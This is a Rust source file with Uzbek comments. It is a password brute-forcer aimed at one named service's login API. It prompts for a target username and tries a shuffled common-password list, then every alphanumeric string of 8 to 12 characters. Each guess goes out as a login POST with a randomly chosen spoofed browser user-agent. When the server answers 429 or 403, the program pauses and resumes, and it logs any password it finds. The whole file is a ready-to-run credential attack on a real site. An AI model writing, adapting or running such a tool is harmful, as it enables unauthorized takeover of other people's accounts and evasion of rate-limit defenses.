use rand::seq::SliceRandom;
use rand::thread_rng;
use reqwest::Client;
use std::error::Error;
use std::fs::{self, File};
use std::io::{self, Write};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::time::sleep;

// Fake device nomlari ro'yxati
const FAKE_DEVICES: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
];

// Mashhur parollar ro'yxati
const COMMON_PASSWORDS: &[&str] = &[
    "password",
    "12345678",
    "qwertyui",
    "admin123",
    "welcome1",
    "password1",
    "123456789",
    "abc12345",
    "letmein1",
    "monkey12",
    "password123",
    "admin111",
    "admin1234",
    "test1234",
    "hello123",
    "1234567890",
    "password12",
    "qwerty123",
    "123123123",
    "11111111",
    "adminadmin",
    "passw0rd",
    "iloveyou",
    "sunshine",
    "princess",
    "football",
    "baseball",
    "dragon",
    "superman",
    "password01",
];

// Log faylini yaratish va yozish uchun funksiya
fn log_message(log_file: &Arc<Mutex<File>>, message: &str, console_print: bool) {
    let mut file = log_file.lock().unwrap();
    writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
    if console_print {
        println!("{}", message);
    }
}

// Log faylini yaratish
fn create_log_file() -> Result<File, Box<dyn Error>> {
    let filename = "password_finder.log";
    let file = File::create(filename)?;
    Ok(file)
}

// Eski log fayllarni o'chirish
fn cleanup_old_logs() -> Result<(), Box<dyn Error>> {
    let filename = "password_finder.log";
    if std::path::Path::new(filename).exists() {
        fs::remove_file(filename)?;
        println!("Eski log fayl o'chirildi: {}", filename);
    }
    Ok(())
}

// Parol generatori - avval mashhur parollardan boshlaydi
struct PasswordGenerator {
    common_passwords: Vec<String>,
    current_common_index: usize,
    charset: Vec<char>,
    current_length: usize,
    current_indices: Vec<usize>,
    used_passwords: std::collections::HashSet<String>,
}

impl PasswordGenerator {
    fn new() -> Self {
        let mut common_passwords: Vec<String> =
            COMMON_PASSWORDS.iter().map(|s| s.to_string()).collect();
        common_passwords.shuffle(&mut thread_rng());

        PasswordGenerator {
            common_passwords,
            current_common_index: 0,
            charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                .chars()
                .collect(),
            current_length: 8,
            current_indices: vec![0; 8],
            used_passwords: std::collections::HashSet::new(),
        }
    }

    fn next(&mut self) -> Option<String> {
        // Avval mashhur parollarni qaytaradi
        if self.current_common_index < self.common_passwords.len() {
            let password = self.common_passwords[self.current_common_index].clone();
            self.current_common_index += 1;

            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }

        // Keyin boshqa parollarni generatsiya qiladi
        loop {
            // Kombinatsiyani generatsiya qilish
            let password: String = self
                .current_indices
                .iter()
                .map(|&i| self.charset[i])
                .collect();

            // Keyingi kombinatsiyaga o'tish
            let mut i = self.current_length - 1;
            loop {
                self.current_indices[i] += 1;
                if self.current_indices[i] < self.charset.len() {
                    break;
                }
                self.current_indices[i] = 0;
                if i == 0 {
                    break;
                }
                i -= 1;
            }

            // Agar barcha kombinatsiyalar tugagan bo'lsa, keyingi uzunlikka o'tish
            if self.current_indices.iter().all(|&x| x == 0) {
                self.current_length += 1;
                if self.current_length > 12 {
                    return None; // Barcha uzunliklar tugadi
                }
                self.current_indices = vec![0; self.current_length];
                continue;
            }

            // Parol avval ishlatilmaganligini tekshirish
            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }
    }

    fn set_start_password(&mut self, start_password: &str) {
        // Berilgan paroldan keyingi parollarni generatsiya qilish uchun holatni o'rnatish
        self.used_passwords.insert(start_password.to_string());

        // Parol uzunligini o'rnatish
        self.current_length = start_password.len();
        self.current_indices = vec![0; self.current_length];

        // Parolni indekslarga aylantirish
        for (i, c) in start_password.chars().enumerate() {
            if let Some(pos) = self.charset.iter().position(|&x| x == c) {
                self.current_indices[i] = pos;
            }
        }

        // Keyingi parolga o'tish
        let mut i = self.current_length - 1;
        loop {
            self.current_indices[i] += 1;
            if self.current_indices[i] < self.charset.len() {
                break;
            }
            self.current_indices[i] = 0;
            if i == 0 {
                break;
            }
            i -= 1;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Eski log fayllarni tozalash
    cleanup_old_logs()?;

    println!("Dastur ishga tushdi");

    // Davom etish yoki boshidan boshlashni so'rash
    println!("Boshidan boshlaymizmi yoki davom ettiramizmi? (b/d):");
    let mut choice = String::new();
    io::stdin().read_line(&mut choice)?;
    let choice = choice.trim();

    let mut start_password = None;
    if choice.eq_ignore_ascii_case("d") {
        println!("Oxirgi urinishdagi parolni kiriting:");
        let mut password = String::new();
        io::stdin().read_line(&mut password)?;
        start_password = Some(password.trim().to_string());
    }

    // Foydalanuvchi nomini olish
    println!("Foydalanuvchi nomini kiriting:");
    let mut username = String::new();
    io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();

    // Foydalanuvchi nomi @ bilan boshlanishini tekshirish
    let username = if !username.starts_with('@') {
        format!("@{}", username)
    } else {
        username
    };

    // Foydalanuvchi nomi uzunligini tekshirish
    if username.len() < 6 || username.len() > 15 {
        println!("Xato: Foydalanuvchi nomi 6 dan 15 belgigacha bo'lishi kerak va @ bilan boshlanishi kerak. Siz kiritgan: {}", username);
        return Ok(());
    }

    println!("{} uchun parolni topish boshlandi...", username);

    // HTTP klientini yaratish
    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

    // O'zgaruvchilarni yaratish
    let found = Arc::new(Mutex::new(false));
    let blocked = Arc::new(Mutex::new(false));
    let tried_counter = Arc::new(Mutex::new(0));

    // Log faylini yaratish
    let log_file = Arc::new(Mutex::new(create_log_file()?));
    log_message(
        &log_file,
        &format!("Dastur ishga tushdi. Foydalanuvchi: {}", username),
        true,
    );

    // Parol generatorini yaratish
    let mut password_generator = PasswordGenerator::new();

    // Agar davom etish tanlangan bo'lsa, generatorni sozlash
    if let Some(start_pwd) = start_password {
        password_generator.set_start_password(&start_pwd);
        log_message(
            &log_file,
            &format!("Davom etish: '{}' parolidan keyin", start_pwd),
            true,
        );
    }

    // Asosiy tsikl
    while let Some(password) = password_generator.next() {
        if *found.lock().unwrap() || *blocked.lock().unwrap() {
            break;
        }

        // Urinishlar sonini oshirish
        let mut tried = tried_counter.lock().unwrap();
        *tried += 1;
        let current_try = *tried;

        // Har 100 urinishda progress haqida xabar berish
        if current_try % 100 == 0 {
            println!(
                "{} ta parol sinandi. Hozirgi parol: {}",
                current_try, password
            );
        }

        // Random device name tanlash
        let device = FAKE_DEVICES
            .choose(&mut thread_rng())
            .unwrap_or(&FAKE_DEVICES[0]);

        // API ga so'rov yuborish
        let payload = serde_json::json!({
            "device": device,
            "loginInput": username,
            "password": password
        });

        let response = client
            .post("https://geektv-backend.onrender.com/api/login")
            .json(&payload)
            .send()
            .await;

        match response {
            Ok(resp) => {
                let status = resp.status();

                if status.is_success() {
                    let response_text = resp
                        .text()
                        .await
                        .unwrap_or_else(|_| "Javob matnini o'qib bo'lmadi".to_string());
                    let message = format!(
                        "PAROL TOPILDI! Urinish {}: Foydalanuvchi: {} | Parol: {} | Response: {}",
                        current_try, username, password, response_text
                    );
                    log_message(&log_file, &message, true);
                    *found.lock().unwrap() = true;
                    break;
                } else if status == 429 || status == 403 {
                    // Server bloklagan (Too Many Requests yoki Forbidden)
                    let message = format!(
                        "SERVER BLOKLADI! Urinish {}: Status: {} | Device: {}",
                        current_try, status, device
                    );
                    log_message(&log_file, &message, true);
                    println!(
                        "Server blokladi! Status: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
                        status
                    );

                    // 1 daqiqa kutish
                    sleep(Duration::from_secs(60)).await;

                    // Device nomini o'zgartirish
                    log_message(
                        &log_file,
                        "Device nomi o'zgartirildi, qayta urinish.",
                        false,
                    );
                    continue;
                }
                // Boshqa xatoliklar uchun log yozmaymiz
            }
            Err(e) => {
                // Tarmoq xatolari yoki timeout
                if e.is_timeout() || e.is_connect() {
                    let message = format!(
                        "NETWORK XATOSI! Urinish {}: Xatolik: {} | Device: {}",
                        current_try, e, device
                    );
                    log_message(&log_file, &message, true);
                    println!(
                        "Tarmoq xatosi: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
                        e
                    );

                    // 1 daqiqa kutish
                    sleep(Duration::from_secs(60)).await;

                    // Device nomini o'zgartirish
                    log_message(
                        &log_file,
                        "Device nomi o'zgartirildi, qayta urinish.",
                        false,
                    );
                    continue;
                }
                // Boshqa xatoliklar uchun log yozmaymiz
            }
        }

        // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
        sleep(Duration::from_millis(50)).await;
    }

    if *found.lock().unwrap() {
        log_message(
            &log_file,
            "Dastur muvaffaqiyatli yakunlandi - parol topildi!",
            true,
        );
    } else if *blocked.lock().unwrap() {
        log_message(
            &log_file,
            "Dastur server tomonidan bloklanganligi sababli to'xtatildi!",
            true,
        );
    } else {
        log_message(&log_file, "Parol topilmadi. Boshqa uzunlikdagi parollarni sinab ko'ring yoki boshqa foydalanuvchi nomini ishlating.", true);
    }

    Ok(())
}